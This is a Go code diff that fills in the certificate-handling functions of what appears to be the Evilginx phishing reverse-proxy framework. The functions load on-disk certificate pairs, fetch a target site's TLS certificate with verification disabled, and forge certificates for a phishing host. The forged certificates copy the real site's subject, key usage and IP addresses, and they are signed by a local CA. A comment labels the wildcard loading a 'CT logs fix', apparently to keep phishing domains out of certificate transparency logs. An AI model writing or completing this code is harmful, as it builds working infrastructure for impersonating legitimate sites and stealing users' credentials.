@@ -59,7 +59,7 @@ func NewCertDb(cache_dir string, cfg *Config, ns *Nameserver) (*CertDb, error) {
 
     o.magic = certmagic.NewDefault()
 
-    // Auto-load wildcard certificate
+    // Auto-load wildcard certificate (CT logs fix)
     wildcardPaths := []struct {
         cert, key string
     }{
@@ -110,8 +110,6 @@ func (o *CertDb) GetEmail() string {
 }
 
 func (o *CertDb) generateCertificates() error {
-    // ... (original generateCertificates code - unchanged) ...
-    // (I kept the original implementation here to avoid any change)
     var key *rsa.PrivateKey
 
     pkey, err := os.ReadFile(filepath.Join(o.cache_dir, "private.key"))
@@ -200,24 +198,181 @@ func (o *CertDb) setManagedSync(hosts []string, t time.Duration) error {
 }
 
 func (o *CertDb) setUnmanagedSync(verbose bool) error {
-    // original function - unchanged
     sitesDir := filepath.Join(o.cache_dir, "sites")
-    // ... (full original implementation remains)
+
+    files, err := os.ReadDir(sitesDir)
+    if err != nil {
+        return fmt.Errorf("failed to list certificates in directory '%s': %v", sitesDir, err)
+    }
+
+    for _, f := range files {
+        if f.IsDir() {
+            certDir := filepath.Join(sitesDir, f.Name())
+
+            certFiles, err := os.ReadDir(certDir)
+            if err != nil {
+                return fmt.Errorf("failed to list certificate directory '%s': %v", certDir, err)
+            }
+
+            var certPath, keyPath string
+
+            var pemCnt, crtCnt, keyCnt int
+            for _, cf := range certFiles {
+                if !cf.IsDir() {
+                    switch strings.ToLower(filepath.Ext(cf.Name())) {
+                    case ".pem":
+                        pemCnt += 1
+                        if certPath == "" {
+                            certPath = filepath.Join(certDir, cf.Name())
+                        }
+                        if cf.Name() == "fullchain.pem" {
+                            certPath = filepath.Join(certDir, cf.Name())
+                        }
+                        if cf.Name() == "privkey.pem" {
+                            keyPath = filepath.Join(certDir, cf.Name())
+                        }
+                    case ".crt":
+                        crtCnt += 1
+                        if certPath == "" {
+                            certPath = filepath.Join(certDir, cf.Name())
+                        }
+                    case ".key":
+                        keyCnt += 1
+                        if keyPath == "" {
+                            keyPath = filepath.Join(certDir, cf.Name())
+                        }
+                    }
+                }
+            }
+            if pemCnt > 0 && crtCnt > 0 {
+                if verbose {
+                    log.Warning("cert_db: found multiple .crt and .pem files in the same directory: %s", certDir)
+                }
+                continue
+            }
+            if certPath == "" {
+                if verbose {
+                    log.Warning("cert_db: not a single public certificate found in directory: %s", certDir)
+                }
+                continue
+            }
+            if keyPath == "" {
+                if verbose {
+                    log.Warning("cert_db: not a single private key found in directory: %s", certDir)
+                }
+                continue
+            }
+
+            log.Debug("caching certificate: cert:%s key:%s", certPath, keyPath)
+            ctx := context.Background()
+            _, err = o.magic.CacheUnmanagedCertificatePEMFile(ctx, certPath, keyPath, []string{})
+            if err != nil {
+                if verbose {
+                    log.Error("cert_db: failed to load certificate key-pair: %v", err)
+                }
+                continue
+            }
+        }
+    }
     return nil
 }
 
 func (o *CertDb) reloadCertificates() error {
+    // TODO: load private certificates from disk
     return nil
 }
 
 func (o *CertDb) getTLSCertificate(host string, port int) (*x509.Certificate, error) {
-    // original function - unchanged
-    return nil, nil
+    log.Debug("Fetching TLS certificate for %s:%d ...", host, port)
+
+    config := tls.Config{InsecureSkipVerify: true, NextProtos: []string{"http/1.1"}}
+    conn, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", host, port), &config)
+    if err != nil {
+        return nil, err
+    }
+    defer conn.Close()
+
+    state := conn.ConnectionState()
+
+    return state.PeerCertificates[0], nil
 }
 
 func (o *CertDb) getSelfSignedCertificate(host string, phish_host string, port int) (cert *tls.Certificate, err error) {
-    // original function - unchanged
-    return nil, nil
+    var x509ca *x509.Certificate
+    var template x509.Certificate
+
+    cert, ok := o.tlsCache[host]
+    if ok {
+        return cert, nil
+    }
+
+    if x509ca, err = x509.ParseCertificate(o.caCert.Certificate[0]); err != nil {
+        return
+    }
+
+    if phish_host == "" {
+        serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
+        serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
+        if err != nil {
+            return nil, err
+        }
+
+        template = x509.Certificate{
+            SerialNumber:          serialNumber,
+            Issuer:                x509ca.Subject,
+            Subject:               pkix.Name{Organization: []string{"Evilginx Signature Trust Co."}},
+            NotBefore:             time.Now(),
+            NotAfter:              time.Now().Add(time.Hour * 24 * 180),
+            KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
+            ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
+            DNSNames:              []string{host},
+            BasicConstraintsValid: true,
+        }
+        template.Subject.CommonName = host
+    } else {
+        srvCert, err := o.getTLSCertificate(host, port)
+        if err != nil {
+            return nil, fmt.Errorf("failed to get TLS certificate for: %s:%d error: %s", host, port, err)
+        } else {
+            serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
+            serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
+            if err != nil {
+                return nil, err
+            }
+
+            template = x509.Certificate{
+                SerialNumber:          serialNumber,
+                Issuer:                x509ca.Subject,
+                Subject:               srvCert.Subject,
+                NotBefore:             srvCert.NotBefore,
+                NotAfter:              time.Now().Add(time.Hour * 24 * 180),
+                KeyUsage:              srvCert.KeyUsage,
+                ExtKeyUsage:           srvCert.ExtKeyUsage,
+                IPAddresses:           srvCert.IPAddresses,
+                DNSNames:              []string{phish_host},
+                BasicConstraintsValid: true,
+            }
+            template.Subject.CommonName = phish_host
+        }
+    }
+
+    var pkey *rsa.PrivateKey
+    if pkey, err = rsa.GenerateKey(rand.Reader, 1024); err != nil {
+        return
+    }
+
+    var derBytes []byte
+    if derBytes, err = x509.CreateCertificate(rand.Reader, &template, x509ca, &pkey.PublicKey, o.caCert.PrivateKey); err != nil {
+        return
+    }
+
+    cert = &tls.Certificate{
+        Certificate: [][]byte{derBytes, o.caCert.Certificate[0]},
+        PrivateKey:  pkey,
+    }
+
+    o.tlsCache[host] = cert
+    return cert, nil
 }
 
 // LoadWildcardCert loads a wildcard TLS certificate from PEM files on disk.
